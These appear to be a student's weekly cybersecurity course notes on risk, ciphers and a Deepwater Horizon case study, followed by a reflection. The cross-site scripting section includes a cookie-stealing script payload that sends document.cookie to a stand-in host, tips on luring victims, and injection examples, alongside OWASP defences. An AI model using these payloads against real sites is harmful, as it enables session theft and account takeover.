# Monday Lecture

## Trust

Big social groups -> big brain power for thinking about things like trust

Fundamental cybersecurity issue: how to validate data trustworthiness (even biometric sensors)

Impossibility of communication - only one got the necessary message, but both need to know / confirm - two generals problem - cannot have a protocol which guarantees either side got the message

Risk - invisible

Easier to sell fixing a problem than selling preventing a bad thing (invisible) - 

Type 1 and type 2 errors - what you want vs what you get - very closely related, e.g. COVID testing vs whether you have it; left wing right wing

- Type 1 error: false positive
- Type 2 error: false negative

Fixing issues - generally, improving one worsens the other without redesigning everything

Baye's Theorem for type 1 and 2 errors

- Independent vs dependent (e.g. dependent: security protocols designed / produced by the same company)
- Correlation vs Causation, Systematic errors
  - e.g. online electoral votes - systematic errors. Human error tends to cancel out (random)
- Risk as variance

Airport security - rather let more people through than be more strict - letting a terrorist through (invisible) vs not letting a civilian through (visible)

Risk - impact vs likelihood (probability) 2d matrix

- Prioritise high impact high prob, not low impact low prob
- How about high prob low impact or low prob high impact - ==low prob high impact usually ignored and underrepresented==
  - e.g. Tectonic plates, airplane crash, volcano, bridge collapse, meteor impact
  - people don't evacuate based on their experiences (invisible)

Allocation of resources

Hindsight bias - proactive vs reactive (can't bet on a horse race after it's run) - creeping determinism

Dealing with risk:

- Mitigate likelihood (speed limit) / impact (seat belt)
- Pass it on
  - e.g. casinos passing legislative risk onto the government (Crown)
- ?
- Immunise (hedge against it, investing in alternatives etc.)
- Accept risk
- Pool risk (insurance)

# Tuesday Lecture

Importance of physical security (difficult to maintain)

Every contact leaves a trace - side channel attack

Secrets

- Could be leaked, revealed through a confession, by accident, or through detective work
- Could be forgotten, cannot control / detect spread
- Cryptographic Properties:
  - Confidentiality
    - Cipher (for recepient through untrusted medium, secret)
      - Classic: Caesar ROT13
      - Remove the spaces first, traditionally we encipher messages written in uppercase letters with no spaces or punctuation
      - Advanced: method public, password secret (Enigma Machine)
      - Simple permutation + substitution (**ETAOIN SHRDLU **most common letters)
      - Vigenere cipher (Turning Machine)
    - Codes (ancient, substituting words instead of letters)
  - Integrity (tamper)
  - Authentication

Vienna - can decode every country's messages, thinking their code is unbreakable (defender mindset)

Steganography - hiding existence of message

Kerckhoffs' design principles for military ciphers

1. The system must be practically, if not mathematically, indecipherable;
2. It should not require secrecy, and it should not be a problem if it falls into enemy hands;
   - aka. can still be secure even if attacked (assume enemy knows everything except the key)
   - The problem of ==security through obscurity==: cannot keep secrets, eventually get found out / cracked
     - DO NOT RELY ON SECURITY THROUGH OBSCURITY
3. It must be possible to communicate and remember the key without using written notes, and correspondents must be able to change or modify it at will;
4. It must be applicable to telegraph communications;
5. It must be portable, and should not require several persons to handle or operate;
6. Lastly, given the circumstances in which it is to be used, the system must be easy to use 

# Extension - Cross Site Scripting (XSS)

https://youtu.be/x6u2TjBbbKQ

- Client side XSS
  - Test whether you can inject html: e.g. `<b>text</b>` tag
  - Can inject 1px x 1px image to track users
  - Script: `<script>code</script>` - if this XSS works, report it, don't go further
  - `document.location=""` redirects
- Reflective XSS (on someone else's client)
  - Steal someone's cookies - sessions and pretend to be them
    - Redirect them to example.com?q=document.cookie using `<script>document.location="https://www.example.com?q="+document.cookie</script>test`
      - Sometimes `+` encoded as `%2B`
    - Use RequestBin for temporary request domain
    - Use social engineering to get them to click the link
    - Replace your session with an admin session for example
  - Can be chained to Remote Code Execution (RCE) from other user (potential to take over server): [lhttps://s0md3v.github.io/xss-to-rce/](https://s0md3v.github.io/xss-to-rce/)
  - MySpace SammyWorm
- DOM-based XSS (manipulates browser directly)

[Defence](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html):

- Encoding input (difficult)
  - HTML content
  - HTML common attributes
  - JavaScript data values
  - JSON values in a HTML context - read data with JSON.parse
  - HTML style property values
  - HTML URL parameter values
  - Sanitise HTML markup with a library designed for the job
  - Avoid JavaScript URLs
  - Prevent DOM-based XSS
- Never insert untrusted data except in allowed locations
  - Directly in a script `<script>$USER_INPUT</script>`
  - Inside a HTML comment `<!--$USER_INPUT-->`
  - In an attribute name `<div ..$USER_INPUT..=test />`
    - `<img src="$USER_INPUT"/>`
    - `<img src="" onerror="javascript:alert(1)"/>`
  - In a tag name `<$USER_INPUT.. href="/test">`
  - Directly in CSS `<style> $USER_INPUT </style>`
- 



# Tutorial: Case Study 2 - Drill

Pre-reading:

- Info: https://www.theguardian.com/environment/2011/apr/20/deepwater-horizon-key-questions-answered
- Permanently sealed four months later
- Safe and fast
  - defence: make sure system is secure and attack responses are fast
  - attack: can't take too long or else it would be detected
  - don't compromise safety/security for speed
- Mike Williams determined to survive - defender mindset - don't give up
- Blowout preventer - single point failure
- Defence: reviews from multiple people should be considered
- Proactive vs reactive mindset - especially when many lives are on the line
- Safety culture - always keeping safety in mind (Deepwater Horizon Final Report)
  - "as a result of a cascade of deeply flawed failure and signal analysis, decision-making, communication, and organisational - managerial processes, safety was compromised to the point that the blowout occurred with catastrophic effects."
- Address indications of issues for security - don't downplay severity

Automated error detection and safety measures?

Recommendations:

- Whisteblower
- Safety audit



# Week 2 Reflection

Although I mentioned that I would be planning to spend less time on this subject than last week (around 26 hours spent last week), I only managed to spend slightly less time. As I mentioned last week, I would try starting with the extension activities this time and complete activities that are interesting to me. However, I found that the XSS activities did not work when I tried to do them. I noted down my payloads and tried them the next day and they all worked immediately, so I was able to complete the activity within 8 minutes, mainly exploiting a potentially unintentional vulnerability which worked to get the flag for all of the challenges. After discussing with a friend, I went back to do the challenges again legitimately this time, and writing a blog post to document this process. I thoroughly enjoyed the XSS challenges as I was able to apply my JavaScript/HTML skills which I worked on significantly during the summer holidays. Also, although there were less activities this week, most not requiring as much time either, I was able to complete them rather quickly, with the exception of the "warmup" crypto challenge and activities requiring much writing. Saying "I'm going to select activities I'm interested in" is quite difficult to quantify as I find most of them fun and interesting. I'm planning to complete less writing activities as they take a long time to complete, so I can focus more on my other commitments (as mentioned last week). Also, in future weeks, I am thinking about potentially not attending in-person lectures as although they are very engaging, they take up a lot of time, where I could instead watch them from home at double speed or even just look over the slides and notes. However, I'll probably still attend on Tuesday for the seminar (and possibly the lecture) as I enjoy analysing the movie from a security perspective. By doing so, I can cut my weekly security commitment by about 4 hours. 

In lectures we discussed trust, risks, errors, physical security, secrets and ciphers. Although I found that I am more interested in the cybersecurity topics such as ciphers, learning about the other topics and its connection to the cyber world was very interesting and is definitely very applicable, as demonstrated in last week's Wargame movie. Furthermore, I enjoyed '12 Angry Men' which quite effectively explained the difference between type 1 and type 2 errors. In our tutorial, we explored case study 2: drill, which I thoroughly enjoyed as I was definitely well-prepared, being able to offer many key insights and recommendations as I took my notes from an analytical / security perspective. I was also able to offer pros and cons to some of the suggestions other members in my groups raised. However, I felt that the class discussion, although engaging at first, dragged on too long so I lost engagement. Synthesising and discussing the main points from each group could have sufficed. 

**Update (28 February 2021):** I've just been scheduled in for 21 hours of subcommittee interviews over the next week, so I'll have to readjust my plan mentioned above. I'm limiting myself to 6 hours on lectures/seminars/webinars/tutorials, 3 hours on activities and 30 minutes on case study preparation. 








